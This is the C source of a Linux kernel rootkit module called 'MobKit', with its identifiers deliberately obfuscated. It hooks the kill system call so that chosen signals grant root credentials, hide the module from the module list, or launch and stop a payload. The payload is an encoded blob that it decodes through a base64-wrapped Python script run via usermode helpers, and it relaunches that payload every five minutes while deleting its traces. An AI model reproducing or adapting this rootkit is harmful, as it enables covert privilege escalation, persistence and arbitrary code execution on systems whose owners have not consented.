#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/ftrace.h>
#include <linux/ptrace.h>
#include <linux/kmod.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/workqueue.h>
#include <linux/delay.h>
#include "ft_help.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("shv-om");
MODULE_DESCRIPTION("MobKit");

static pid_t shajshejxn = -1;

static struct list_head *prev_module;
static short dyehsndjks = 0;

static struct workqueue_struct *wq_stat;
static struct delayed_work scheduled_work;

#define HAJSNEJDNF "/tmp/hsjajsnsjd.py"
#define JSHDNEJSNA "/tmp/ahsjendhah.txt"

/* Encoded Payload - dheysjdnsj.py will get the real payload by Decoding 1. from Hex, 2. XOR with 0x5A, 3. from Base64 */
char shdjensjdm[] = "\x3b\x0d\x6b\x2d\x38\x69\x10\x6a\x13\x12\x14\x2c\x03\x68\x2e\x36\x3e\x19\x2d\x3d\x39\x69\x0c\x33\x39\x12\x10\x2c\x03\x68\x0c\x20\x39\x23\x2d\x3d\x38\x69\x17\x29\x13\x12\x14\x6f\x39\x23\x2d\x3d\x39\x68\x36\x34\x38\x37\x1c\x29\x19\x3d\x2a\x1e\x17\x36\x63\x10\x0f\x19\x2d\x3d\x0b\x20\x10\x3c\x0f\x1f\x63\x09\x0c\x19\x1b\x63\x13\x19\x39\x23\x17\x1e\x17\x2f\x17\x19\x6e\x22\x17\x0e\x17\x2f\x14\x1e\x0f\x34\x16\x19\x1b\x6a\x14\x1e\x17\x23\x17\x0b\x2a\x13\x0e\x6b\x14\x0f\x16\x19\x18\x0b\x0e\x6b\x10\x0f\x13\x1e\x6a\x3d\x10\x20\x1b\x2f\x17\x19\x6e\x2d\x16\x30\x1b\x34\x16\x19\x1b\x22\x17\x30\x17\x6a\x14\x0b\x2a\x6a\x39\x34\x31\x6c\x19\x33\x1b\x3d\x13\x19\x18\x69\x3b\x02\x08\x35\x13\x12\x14\x2c\x03\x68\x2e\x36\x3e\x19\x6f\x20\x38\x68\x14\x28\x00\x02\x0b\x35\x39\x68\x63\x30\x3b\x68\x0c\x6a\x16\x31\x1c\x1d\x02\x6a\x36\x15\x08\x0c\x0b\x29\x13\x12\x14\x2c\x03\x68\x2e\x36\x3e\x19\x6f\x0e\x0e\x6a\x14\x16\x02\x6b\x14\x0f\x0f\x31\x0c\x18\x0e\x09\x31\x3d\x03\x02\x17\x3d\x39\x20\x35\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x20\x16\x37\x14\x2c\x38\x37\x6f\x36\x03\x69\x0b\x35\x11\x1f\x17\x23\x02\x6a\x36\x0b\x16\x19\x18\x1e\x17\x36\x63\x0b\x0e\x6b\x10\x0f\x11\x09\x31\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x20\x16\x34\x14\x36\x38\x37\x08\x32\x38\x1d\x2d\x35\x00\x33\x10\x1e\x38\x68\x6f\x2f\x00\x0d\x14\x6a\x3b\x0d\x63\x2f\x13\x1d\x00\x23\x38\x68\x6a\x3d\x3f\x6b\x18\x0a\x0f\x36\x08\x63\x02\x1d\x6e\x33\x16\x37\x0c\x2f\x03\x68\x63\x31\x00\x09\x3d\x34\x3e\x02\x08\x37\x16\x0e\x3d\x34\x11\x09\x31\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x20\x16\x37\x14\x29\x38\x69\x14\x36\x11\x19\x31\x11\x00\x02\x32\x30\x00\x02\x18\x6a\x13\x1f\x0c\x6e\x03\x68\x0c\x2d\x3e\x1d\x36\x2c\x38\x33\x18\x32\x39\x23\x18\x36\x15\x3d\x35\x3d\x13\x19\x1b\x3d\x39\x12\x10\x2a\x38\x34\x0b\x35\x00\x33\x10\x1d\x03\x0d\x36\x29\x00\x0d\x0b\x3d\x3e\x1d\x62\x3d\x03\x68\x63\x2f\x38\x37\x0c\x30\x3e\x19\x18\x6a\x38\x23\x18\x1e\x17\x33\x18\x20\x00\x02\x10\x68\x00\x02\x13\x6c\x13\x12\x2e\x36\x3c\x09\x13\x2a\x19\x3d\x2a\x20\x00\x02\x10\x68\x00\x02\x13\x3d\x0a\x09\x18\x20\x38\x68\x14\x28\x00\x02\x0b\x2f\x39\x68\x63\x30\x3b\x68\x0c\x6a\x11\x12\x14\x2c\x03\x68\x2e\x36\x3e\x19\x6f\x18\x08\x36\x63\x10\x0e\x31\x0c\x0f\x16\x19\x18\x20\x38\x68\x14\x28\x00\x02\x0b\x2f\x0f\x6a\x63\x1e\x09\x6b\x63\x0e\x0c\x1c\x10\x1c\x0b\x0f\x6a\x2a\x19\x33\x17\x3d\x09\x1c\x08\x19\x3f\x68\x39\x2d\x38\x6a\x08\x3c\x3e\x20\x18\x23\x3b\x6b\x63\x09\x08\x0c\x63\x0b\x03\x0c\x36\x29\x17\x1d\x1c\x1f\x02\x6a\x0c\x6e\x17\x68\x14\x0c\x14\x68\x31\x2d\x0e\x34\x6a\x11\x39\x68\x0c\x23\x3e\x37\x0c\x23\x16\x34\x14\x36\x3e\x12\x14\x2c\x03\x68\x2e\x2c\x39\x12\x0b\x35\x39\x68\x63\x30\x3b\x68\x0c\x6a\x16\x36\x14\x0a\x0e\x1c\x63\x0e\x0e\x6a\x14\x16\x08\x0c\x0b\x29\x13\x12\x14\x2c\x03\x68\x2e\x36\x3e\x19\x6f\x0e\x0e\x6b\x63\x09\x08\x0c\x0c\x0e\x08\x0f\x1c\x1f\x08\x1c\x13\x29\x13\x1e\x1f\x2a\x19\x34\x14\x36\x39\x34\x00\x36\x39\x33\x6f\x33\x3b\x0d\x6f\x31\x11\x19\x32\x13\x0e\x6b\x14\x0f\x16\x19\x18\x0b\x0e\x6b\x10\x0f\x11\x09\x31\x11\x39\x68\x0c\x23\x3e\x37\x0c\x23\x16\x37\x22\x2a\x39\x69\x08\x36\x38\x33\x3d\x22\x11\x0b\x2a\x20\x3b\x0d\x3e\x2f\x03\x0d\x2d\x2f\x39\x68\x36\x34\x38\x37\x1c\x29\x11\x12\x14\x2a\x00\x68\x6f\x32\x38\x19\x6f\x0e\x09\x0f\x3e\x10\x0e\x36\x0b\x29\x13\x1d\x22\x32\x38\x0d\x10\x31\x03\x09\x1b\x2b\x03\x02\x10\x34\x39\x20\x35\x3d\x11\x12\x14\x36\x39\x34\x00\x36\x39\x33\x6f\x30\x38\x1d\x63\x20\x00\x09\x3d\x2a\x16\x19\x18\x20\x3f\x02\x17\x2f\x00\x02\x32\x2a\x3e\x19\x3d\x2a\x11\x09\x31\x11\x3e\x68\x32\x2a\x38\x1d\x0f\x3d\x0c\x12\x10\x6b\x00\x0e\x35\x11\x13\x19\x1b\x3d\x13\x1d\x14\x2c\x38\x37\x6e\x29\x13\x1d\x1c\x31\x00\x12\x13\x3d\x0a\x09\x18\x20\x00\x02\x10\x68\x00\x02\x13\x2f\x03\x0d\x14\x30\x00\x02\x18\x6a\x11\x19\x31\x11\x13\x19\x1b\x3d\x13\x12\x08\x23\x3f\x0e\x35\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x69\x3b\x1d\x36\x29\x00\x09\x18\x0f\x39\x34\x0c\x36\x15\x3d\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x31\x03\x02\x08\x32\x13\x1e\x6a\x3d\x03\x68\x63\x2f\x38\x33\x6f\x23\x00\x0d\x14\x68\x11\x1e\x1f\x2d\x17\x30\x0b\x2a\x16\x37\x08\x36\x03\x68\x63\x31\x00\x09\x3d\x2a\x16\x34\x14\x6a\x39\x37\x36\x2d\x11\x19\x31\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x3b\x0d\x03\x3d\x38\x37\x63\x6a\x13\x1d\x08\x32\x3e\x1d\x1f\x6c\x19\x33\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x33\x39\x37\x0c\x32\x3b\x2d\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x2a\x00\x33\x18\x31\x03\x02\x08\x32\x16\x37\x22\x2c\x3e\x68\x0c\x23\x11\x19\x31\x3d\x0a\x0e\x6a\x3d\x13\x34\x1f\x33\x15\x3d\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x03\x68\x63\x2f\x38\x33\x6f\x30\x38\x1d\x63\x20\x00\x09\x3d\x2a\x19\x33\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x20\x3f\x02\x17\x2f\x00\x02\x32\x2a\x3e\x19\x3d\x2d\x11\x0b\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x2d\x39\x23\x1b\x63\x13\x12\x14\x6b\x03\x34\x18\x23\x38\x68\x14\x36\x39\x69\x17\x2f\x0f\x1d\x63\x2d\x00\x0d\x6e\x35\x00\x1d\x1c\x6a\x03\x09\x2d\x3d\x39\x68\x32\x36\x38\x1d\x2d\x63\x0c\x12\x10\x6b\x00\x09\x2d\x3d\x39\x69\x08\x31\x38\x69\x0c\x6a\x0a\x02\x14\x6b\x03\x34\x18\x23\x38\x68\x14\x36\x39\x69\x17\x2f\x0f\x1f\x36\x0b\x08\x09\x2d\x3d\x39\x69\x08\x31\x00\x02\x10\x23\x0a\x02\x14\x6b\x03\x34\x18\x23\x38\x68\x14\x36\x39\x69\x17\x2f\x0f\x1f\x36\x0b\x08\x09\x31\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x39\x37\x0c\x20\x3e\x0d\x22\x6a\x16\x19\x18\x36\x39\x34\x10\x2c\x39\x33\x1b\x63\x13\x12\x18\x20\x16\x37\x14\x2c\x38\x0d\x6b\x6b\x38\x37\x36\x30\x03\x02\x08\x36\x11\x19\x31\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x39\x37\x0c\x20\x3e\x0d\x22\x6a\x13\x1e\x6a\x3d\x11\x12\x10\x36\x39\x69\x0c\x29\x3e\x19\x1b\x28\x13\x1d\x0c\x23\x39\x37\x63\x23\x11\x09\x6f\x31\x00\x0d\x14\x2c\x00\x1d\x0f\x35\x11\x09\x1b\x28\x13\x1d\x03\x33\x39\x1d\x36\x31\x15\x33\x18\x6d\x38\x69\x17\x2f\x00\x68\x0c\x6a\x39\x1d\x36\x31\x11\x19\x36\x63\x16\x19\x18\x2d\x39\x1d\x36\x31\x15\x33\x18\x6d\x38\x69\x17\x2f\x00\x68\x0c\x6a\x39\x12\x18\x2a\x00\x19\x3d\x2a\x3c\x0c\x22\x2f\x13\x3d\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x30\x38\x68\x6f\x2f\x16\x34\x14\x36\x38\x37\x08\x32\x38\x1d\x2d\x35\x39\x37\x0c\x20\x3e\x0d\x22\x6a\x16\x37\x0c\x2f\x03\x68\x63\x31\x00\x09\x3d\x2a\x11\x0b\x35\x3d\x13\x19\x1b\x3d\x00\x02\x32\x30\x00\x02\x18\x6a\x13\x1f\x0c\x6e\x03\x68\x0c\x2d\x3e\x1d\x36\x2c\x38\x33\x18\x32\x39\x23\x18\x36\x15\x3d\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x12\x18\x32\x39\x69\x17\x11\x13\x19\x1b\x3d\x13\x1d\x00\x2a\x38\x37\x1c\x29\x38\x12\x31\x6c\x19\x33\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x03\x68\x63\x2f\x38\x33\x6f\x30\x38\x1d\x63\x20\x00\x09\x3d\x2a";

bool ldksjeushd(const char *path) {
    struct file *file = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(file)) {
        return false;
    }
    filp_close(file, NULL);
    return true;
}

void ahsgehdbsj(const char *filepath) {
    char *argv[] = { "/bin/bash", "-c", NULL, NULL };
    char cmd[256];
    int ret;

    snprintf(cmd, sizeof(cmd), "rm -f %s", filepath);
    argv[2] = cmd;

    ret = call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);

    if(ret == 0){
        printk(KERN_INFO "mob: [INFO] File Deleted %s\n", filepath);
    }
}

void hajsndjems(void){
    list_add(&THIS_MODULE->list, prev_module);
}

void uehsnshans(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void heuhsjalso(void){

    struct cred *root;
    root = prepare_creds();

    if (root == NULL){
        return;
    }

    root->uid = KUIDT_INIT(0);
    root->gid = KGIDT_INIT(0);
    root->euid = KUIDT_INIT(0);
    root->egid = KGIDT_INIT(0);
    root->suid = KUIDT_INIT(0);
    root->sgid = KGIDT_INIT(0);
    root->fsuid = KUIDT_INIT(0);
    root->fsgid = KGIDT_INIT(0);

    commit_creds(root);
}


void idjehsndhs(void){

    char *argv[] = { "/bin/bash", "-c", "ps aux | grep 'hsjajsnsjd' | grep -v 'grep' | awk '{print $2}' > /tmp/dheysgdbah.txt", NULL };
    static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    
    struct file *file;
    char buf[16] = {0};
    loff_t pos = 0;
    int ret;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret != 0) {
        return;
    }

    file = filp_open("/tmp/dheysgdbah.txt", O_RDONLY, 0);
    if (IS_ERR(file)) {
        printk(KERN_ERR "Failed to open file, error: %ld\n", PTR_ERR(file));
        return;
    }

    ret = kernel_read(file, buf, sizeof(buf) - 1, &pos);
    filp_close(file, NULL);
    
    if (ret > 0) {
        ret = kstrtoint(buf, 10, &shajshejxn);
        if (ret < 0) {
            shajshejxn = -1;
        } else {
            printk(KERN_INFO "mob: [INFO] Retrieved PID: %d\n", shajshejxn);
        }
    } else {
        shajshejxn = -1;
    }
}

int jdkelskjds(const char *filepath, char *data) {
    struct file *file;
    loff_t pos = 0;
    int ret;
    size_t written = 0;
    size_t data_size = sizeof(shdjensjdm) - 1;

    file = filp_open(filepath, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (IS_ERR(file)) {
        return PTR_ERR(file);
    }

    while (written < data_size) {
        ret = kernel_write(file, data + written, data_size - written, &pos);
        if (ret < 0) {
            break;
        }
        written += ret;
    }

    filp_close(file, NULL);

    return (written == data_size) ? 0 : -EIO;
}

int uehsjdnshd(void){

    char *argv[] = { "/bin/bash", "-c", "echo 'aW1wb3J0IGJhc2U2NAp3aXRoIG9wZW4oJy90bXAvYWhzamVuZGhhaC50eHQnLCAncmInKSBhcyBmOgogICAgdHJnZWhqZGtlbCA9IGYucmVhZCgpCmtleSA9IDB4NUEKaHNuZHV0aWVsYSA9IGJ5dGVzKFtiIF4ga2V5IGZvciBiIGluIHRyZ2VoamRrZWxdKQp0cnk6CiAgICBoc25haHNuZWpkID0gYmFzZTY0LmI2NGRlY29kZShoc25kdXRpZWxhKS5kZWNvZGUoJ3V0Zi04JykKICAgIHdpdGggb3BlbignL3RtcC9oc2phanNuc2pkLnB5JywgJ3cnKSBhcyBmOgogICAgICAgIGYud3JpdGUoaHNuYWhzbmVqZCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJcGFzcwo=' | base64 -d > /tmp/dheysjdnsj.py && exec python3 /tmp/dheysjdnsj.py > decoderlog.txt 2>&1", NULL };
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    int ret;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    return 0;
}

int jdkepflfks(void){

    char *argv[] = { "/bin/bash", "-c", "nohup python3 /tmp/hsjajsnsjd.py > /dev/null 2>&1 & disown", NULL };
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    int ret;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret == 0) {
        idjehsndhs();
        printk(KERN_INFO "mob: [INFO] Initiated...\n");
        
        while (shajshejxn == -1){
            ssleep(2);
            idjehsndhs();
        }
    }

    if (ldksjeushd(JSHDNEJSNA)){
        ahsgehdbsj(JSHDNEJSNA);
    }

    return 0;
}

void uwhanslajs(void) {
    struct task_struct *task;

    if (shajshejxn < 0) {
        return;
    }

    idjehsndhs();

    for_each_process(task) {
        if (task->pid == shajshejxn) {
            send_sig(SIGKILL, task, 1);
            shajshejxn = -1;
            return;
        }
    }

    shajshejxn = -1;
}


void oehjdpajek(void){
    if (jdkelskjds(JSHDNEJSNA, shdjensjdm) >= 0) {           
        uehsjdnshd(); // execute decoder
        ssleep(7);
        if (ldksjeushd("/tmp/dheysjdnsj.py")){
            ahsgehdbsj("/tmp/dheysjdnsj.py");
        }

        jdkepflfks(); // execute payload
        ssleep(7);
        ahsgehdbsj(HAJSNEJDNF);
    }
}


asmlinkage int ghsjdkensj(struct ftrace_regs *regs) {
    struct pt_regs *pt_regs = ftrace_get_regs(regs);

    if (!pt_regs) {
        return -EINVAL;
    }

    void heuhsjalso(void);

    void hajsndjems(void);
    void uehsnshans(void);

    int jdkepflfks(void);
    void uwhanslajs(void);

    int sig = regs_get_kernel_argument(pt_regs, 1);

    if (sig == 0) {
        return 0;
    }
    
    if (sig == 61) {
        if (shajshejxn == -1) {
            oehjdpajek();
        } else {
            uwhanslajs();
        }
        return 0;
    } else if (sig == 64){
        heuhsjalso();
        return 0;
    } else if ((sig == 63) && (dyehsndjks == 0)){
        uehsnshans();
        dyehsndjks = 1;
    } else if ((sig == 63) && (dyehsndjks == 1)){
        hajsndjems();
        dyehsndjks = 0;
    } else {
        return orig_kill(pt_regs);
    }

    return 0;
}


// Scheduled function to check the process periodically
void check_process_function(struct work_struct *work) {
    idjehsndhs();
    if (shajshejxn <= 0) {
        oehjdpajek();
        printk(KERN_INFO "mob: [INFO] Scheduled Task Executed Correctly with PID: %d\n", shajshejxn);
    } else {
        printk(KERN_INFO "mob: [INFO] Skipping Scheduled Task: Process already running\n");
    }
  
    if (!delayed_work_pending(&scheduled_work)) {
            queue_delayed_work(wq_stat, &scheduled_work, 5 * 60 * HZ);
        }
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", ghsjdkensj, &orig_kill),
};

static int __init mob_module_init(void) {
    int err = uejshdnskd(&hooks[0]);
    
    if (err) {
        return err;
    }
    printk(KERN_INFO "mob: [INFO] Module loaded\n");

    oehjdpajek();

    wq_stat = create_singlethread_workqueue("wq_stat");
    if (!wq_stat) {
        printk(KERN_ERR "mob: Failed to create workqueue\n");
        return -ENOMEM;
    }

    // Initialize and schedule the delayed work
    INIT_DELAYED_WORK(&scheduled_work, check_process_function);
    queue_delayed_work(wq_stat, &scheduled_work, 5 * 60 * HZ);

    return 0;
}

static void __exit mob_module_exit(void) {
    jdhenshdks(&hooks[0]);

    cancel_delayed_work_sync(&scheduled_work);
    destroy_workqueue(wq_stat);
    
    printk(KERN_INFO "mob: [INFO] Module unloaded -> Work Queue Destroyed\n");
}

module_init(mob_module_init);
module_exit(mob_module_exit);